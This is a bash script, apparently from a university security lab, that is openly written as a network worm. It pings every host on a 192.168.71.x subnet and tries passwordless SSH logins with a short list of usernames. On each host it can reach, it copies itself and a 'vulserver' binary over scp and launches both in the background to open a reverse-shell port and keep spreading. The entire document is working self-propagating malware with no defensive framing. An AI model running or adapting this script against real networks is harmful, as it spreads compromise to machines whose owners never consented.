#!/bin/bash

# Worm script with progress bar for network scan
NETWORK_PREFIX="192.168.71"
PORT_BASE=4445
USERNAMES=("ubuntu" "server" "wanthinnn" "client")
ME=$(hostname -I | awk '{print $1}')
COUNT=0
TOTAL=254
BAR_WIDTH=40

echo "[*] Starting worm from $ME"

echo
# Loop through hosts
for ((i=1; i<=TOTAL; i++)); do
    TARGET="$NETWORK_PREFIX.$i"

    # Update progress bar
    percent=$(( i * 100 / TOTAL ))
    filled=$(( BAR_WIDTH * i / TOTAL ))
    empty=$(( BAR_WIDTH - filled ))
    bar="$(printf '#%.0s' $(seq 1 $filled))$(printf ' %.0s' $(seq 1 $empty))"
    printf "\rProgress: [%-${BAR_WIDTH}s] %3d%% (%d/%d)" "$bar" "$percent" "$i" "$TOTAL"

    # Skip self
    if [ "$TARGET" == "$ME" ]; then
        continue
    fi

    ping -c 1 -W 1 $TARGET &> /dev/null
    if [ $? -eq 0 ]; then
        echo -e "\n[+] $TARGET is up!"

        for USER in "${USERNAMES[@]}"; do
            echo "[*] Trying user $USER@$TARGET..."
            ssh -o BatchMode=yes -o ConnectTimeout=3 $USER@$TARGET "echo 1" 2>/dev/null

            if [ $? -eq 0 ]; then
                echo "[+] Found working user: $USER"

                # Copy files
                scp /home/wanthinnn/Documents/NT230/Labs/Lab-3/vul_server $USER@$TARGET:/tmp/vulserver
                scp /tmp/worm.sh $USER@$TARGET:/tmp/worm.sh

                # Assign reverse shell port
                PORT=$((PORT_BASE + COUNT))
                echo "[*] Assigning reverse shell port: $PORT"

                # Execute payloads in background
                ssh $USER@$TARGET "chmod +x /tmp/vulserver /tmp/worm.sh; \
                                   nohup /tmp/vulserver $PORT >/dev/null 2>&1 & \
                                   sleep 1; \
                                   nohup bash /tmp/worm.sh >/dev/null 2>&1 &" &

                COUNT=$((COUNT + 1))
                break
            fi
        done
    fi
done

echo -e "\n[*] Worm scan complete. Total targets infected: $COUNT"
